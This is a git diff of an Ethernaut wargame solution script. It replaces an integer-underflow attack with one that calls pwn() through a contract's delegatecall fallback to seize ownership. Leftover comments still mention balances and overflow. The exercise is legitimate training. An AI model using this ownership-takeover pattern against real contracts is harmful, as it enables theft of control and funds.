@@ -1,3 +1,4 @@
+import { Wallet } from "ethers";
 import { ethers } from "hardhat";
 
 const attackToken = async () => {
@@ -6,60 +7,65 @@ const attackToken = async () => {
     const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
 
     // Don't touch below 🚀
-    // Vulnerability from contract not safe from overflow and underflow
+    // Vulnerability from pwn() function with delegatecall in fallback to change owner
     // additional read:
     // https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows
     // typing all commands in console below
     // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
     const ABI = [
         {
-            inputs: [{ internalType: "uint256", name: "_initialSupply", type: "uint256" }],
+            inputs: [{ internalType: "address", name: "_delegateAddress", type: "address" }],
             outputs: [],
             payable: undefined,
             stateMutability: "nonpayable",
             type: "constructor",
         },
         {
-            inputs: [{ internalType: "address", name: "_owner", type: "address" }],
-            name: "balanceOf",
-            outputs: [{ internalType: "uint256", name: "balance", type: "uint256" }],
-            stateMutability: "view",
-            type: "function",
+            stateMutability: "nonpayable",
+            type: "fallback",
         },
         {
             inputs: [],
-            name: "totalSupply",
-            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+            name: "owner",
+            outputs: [{ internalType: "address", name: "", type: "address" }],
             stateMutability: "view",
             type: "function",
         },
-        {
-            inputs: [
-                { internalType: "address", name: "_to", type: "address" },
-                { internalType: "uint256", name: "_value", type: "uint256" },
-            ],
-            name: "transfer",
-            outputs: [{ internalType: "bool", name: "", type: "bool" }],
-            stateMutability: "nonpayable",
-            type: "function",
-        },
     ];
-
     const contract = await ethers.getContractAt(ABI, tokenAddress);
     console.log("Checking current player balance...");
-    const playerBalance = await contract.balanceOf(player);
-    console.log(`Current player balance: ${playerBalance} TOKENS`);
-    console.log("Causing underflow by transfering more than the starting 20 TOKENS...");
-    const underflow = await contract.transfer("0x0000000000000000000000000000000000000000", 21);
-    const wait1 = await underflow.wait();
-    console.log(wait1);
-    console.log("Checking current player balance again...");
-    const NewPlayerBalance = await contract.balanceOf(player);
-    console.log(`Current player balance: ${NewPlayerBalance} TOKENS`);
-    if (NewPlayerBalance > playerBalance) {
-        console.log("Congrats you now have more than the starting tokens, submit to ethernaut...");
+    const oldOwner = await contract.owner();
+    console.log(`Current contract owner: ${oldOwner}`);
+    // using my custom rpc stored in .env (for privacy)
+    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
+    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+    const PRIVATE_KEY =
+        process.env.PRIVATE_KEY || ""; /*Private Keys in .env file or hardcode here*/
+    const wallet = new Wallet(PRIVATE_KEY, provider);
+    // endoding function here
+    console.log("Encoding function signature...");
+    const funcSign = ["function pwn()"];
+    const iface = new ethers.utils.Interface(funcSign);
+    const signature = iface.encodeFunctionData("pwn()");
+    // sending transaction here
+    console.log("Now sending transaction to call fallback ...");
+    const tx2 = await wallet.sendTransaction({
+        from: player,
+        to: tokenAddress,
+        data: signature,
+    });
+    const txReceipt = await tx2.wait(1);
+    console.log(txReceipt);
+    console.log("Checking that player is now owner...");
+    const newOwner = await contract.owner();
+    console.log(`Contract Owner is now: ${newOwner}`);
+    const owner = newOwner === player;
+    console.log(`Player is now owner: ${owner}`);
+    if (owner) {
+        console.log("Congrats! Player is now the new owner...");
+        console.log("Done...submit in ethernaut");
     } else {
-        console.log("No Additional tokens, review code above and try again...");
+        console.log("Player is not owner, please review code above");
     }
 };
 
